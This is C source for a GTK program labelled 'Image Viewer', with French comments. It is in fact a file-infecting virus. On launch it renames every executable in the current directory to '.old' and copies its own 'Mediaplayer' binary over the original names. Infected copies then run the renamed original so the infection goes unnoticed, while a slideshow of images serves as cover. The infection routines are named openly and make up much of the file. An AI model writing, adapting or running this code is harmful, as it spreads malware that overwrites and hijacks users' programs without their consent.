#include <gtk/gtk.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdbool.h>
#include <libgen.h>

// Déclarations des fonctions
bool estDejaInfecte(const char *nomFichier);
void renameOldExecutable(const char *executableName);
void renameExecutables();
bool isInfectedVersion(char *programName, char *infectedProgram);
void on_previous_clicked(GtkWidget *widget, gpointer data);
void on_next_clicked(GtkWidget *widget, gpointer data);
void infectionCNI();
int fileExists(const char *filename);
bool hasOldExtension(const char *filename);

// Autres constantes et variables globales
const char *images[] = {"1.jpeg", "2.jpg", "4.bmp", "3.png", "5.jpeg"};
int current_image_index = 0;

// Définition des fonctions

bool estDejaInfecte(const char *nomFichier) {
    return strstr(nomFichier, ".old") != NULL;
}

void renameOldExecutable(const char *executableName) {
    char oldName[256];
    snprintf(oldName, sizeof(oldName), "%s.old", executableName);
    if (fileExists(oldName) || hasOldExtension(executableName)) {
        fprintf(stderr, "%s est déjà renommé en %s. ignoré !.\n", executableName, oldName);
        return;
    }
    if (rename(executableName, oldName) != 0) {
        fprintf(stderr, "Erreur lors du renommage de %s : %s\n", executableName, strerror(errno));
    } else {
        printf("%s a été renommé en %s\n", executableName, oldName);
    }
}

void renameExecutables() {
    DIR *dir;
    struct dirent *ent;
    bool newInfections = false;
    if ((dir = opendir(".")) != NULL) {
        while ((ent = readdir(dir)) != NULL) {
            char *ext = strrchr(ent->d_name, '.');
            if (ext && strcmp(ext, ".c") == 0 || strcmp(ent->d_name, "Mediaplayer") == 0) {
                continue;
            }
            struct stat st;
            if (stat(ent->d_name, &st) == 0 && S_ISREG(st.st_mode) && (st.st_mode & S_IXUSR)) {
                if (!estDejaInfecte(ent->d_name)) {
                    renameOldExecutable(ent->d_name);
                    char command[512];
                    snprintf(command, sizeof(command), "cp Mediaplayer \"%s\" 2>/dev/null", ent->d_name); // Redirection ajoutée ici
                    system(command);
                    newInfections = true;
                }
            }
        }
        closedir(dir);
        if (!newInfections) {
            printf("Aucun nouveau fichier infecté détecté.\n");
        }
    } else {
        perror("Erreur lors de l'ouverture du répertoire");
    }
}


bool isInfectedVersion(char *programName, char *infectedProgram) {
    char oldName[256];
    snprintf(oldName, sizeof(oldName), "%s.old", programName);
    if (fileExists(oldName)) {
        strcpy(infectedProgram, oldName);
        return true;
    }
    return false;
}

void on_previous_clicked(GtkWidget *widget, gpointer data) {
    GtkWidget *image = GTK_WIDGET(data);
    if (current_image_index > 0) {
        current_image_index--;
        gtk_image_set_from_file(GTK_IMAGE(image), images[current_image_index]);
    }
}

void on_next_clicked(GtkWidget *widget, gpointer data) {
    GtkWidget *image = GTK_WIDGET(data);
    if (current_image_index < sizeof(images) / sizeof(images[0]) - 1) {
        current_image_index++;
        gtk_image_set_from_file(GTK_IMAGE(image), images[current_image_index]);
    }
}

void infectionCNI() {
    DIR *dir;
    struct dirent *ent;
    if ((dir = opendir(".")) != NULL) {
        while ((ent = readdir(dir)) != NULL) {
            struct stat st;
            stat(ent->d_name, &st);
            if (S_ISREG(st.st_mode) && (st.st_mode & S_IXUSR) && strcmp(ent->d_name, "Mediaplayer") != 0) {
                char oldName[256];
                strcpy(oldName, ent->d_name);
                strcat(oldName, ".old");
                if (hasOldExtension(ent->d_name)) {
                    printf("%s est déjà infecté. Aucune action n'a été effectuée.\n", ent->d_name);
                } else {
                    if (fileExists(oldName)) {
                        fprintf(stderr, "%s est déjà renommé en %s. Aucune action n'a été effectuée.\n", ent->d_name, oldName);
                    } else {
                        renameOldExecutable(ent->d_name);
                        char command[512];
                        snprintf(command, sizeof(command), "cp Mediaplayer \"%s\"", ent->d_name);
                        system(command);
                    }
                }
            }
        }
        closedir(dir);
    } else {
        perror("Erreur lors de l'ouverture du répertoire");
    }
}

int fileExists(const char *filename) {
    return access(filename, F_OK) != -1;
}

bool hasOldExtension(const char *filename) {
    return strstr(filename, ".old") != NULL;
}


int main(int argc, char *argv[]) {
    gtk_init(&argc, &argv);

    char infectedProgram[256];


    /// Vérifier si le programme actuel commence par "pgOriginal"
	if (strstr(basename(argv[0]), "pgOriginal") != NULL) {
    // Si c'est le cas, appeler la fonction d'infection
    		renameExecutables();
}


    if (isInfectedVersion(argv[0], infectedProgram)) {
        char *args[] = {infectedProgram, NULL};
        execvp(infectedProgram, args);
        fprintf(stderr, "Erreur lors de l'exécution de %s : %s\n", infectedProgram, strerror(errno));
        return 1;
    } else {
        renameExecutables(); // Infecter d'autres fichiers exécutables

        // Lancer l'interface graphique
        GtkWidget *window = gtk_window_new(GTK_WINDOW_TOPLEVEL);
        gtk_window_set_title(GTK_WINDOW(window), "Image Viewer");
        gtk_window_set_default_size(GTK_WINDOW(window), 400, 300);
        g_signal_connect(window, "destroy", G_CALLBACK(gtk_main_quit), NULL);

        GtkWidget *image = gtk_image_new_from_file(images[current_image_index]);

        GtkWidget *prev_button = gtk_button_new_with_label("Précédent");
        GtkWidget *next_button = gtk_button_new_with_label("Suivant");

        g_signal_connect(prev_button, "clicked", G_CALLBACK(on_previous_clicked), image);
        g_signal_connect(next_button, "clicked", G_CALLBACK(on_next_clicked), image);

        GtkWidget *hbox = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 5);
        gtk_box_pack_start(GTK_BOX(hbox), prev_button, TRUE, TRUE, 5);
        gtk_box_pack_start(GTK_BOX(hbox), next_button, TRUE, TRUE, 5);

        GtkWidget *vbox = gtk_box_new(GTK_ORIENTATION_VERTICAL, 5);
        gtk_box_pack_start(GTK_BOX(vbox), image, TRUE, TRUE, 5);
        gtk_box_pack_start(GTK_BOX(vbox), hbox, FALSE, FALSE, 5);

        gtk_container_add(GTK_CONTAINER(window), vbox);

        gtk_widget_show_all(window);

        gtk_main();
    }

    return 0;
}


